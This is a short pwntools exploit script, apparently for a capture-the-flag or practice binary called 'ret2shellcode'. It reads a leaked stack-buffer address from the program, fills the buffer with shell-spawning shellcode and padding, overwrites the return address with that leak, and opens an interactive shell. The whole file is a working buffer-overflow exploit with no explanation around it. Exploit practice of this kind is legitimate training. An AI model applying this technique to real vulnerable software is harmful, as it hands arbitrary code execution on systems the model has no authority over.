from pwn import *

elf = context.binary = ELF("./ret2shellcode")

r = process(elf.path)

r.recvuntil(b"The buffer is at: ")
leak = int(r.recvline().strip(),16)

shellcode = asm(shellcraft.sh())

r.sendline(shellcode.ljust(9016,b"A")+p64(leak))

r.interactive()
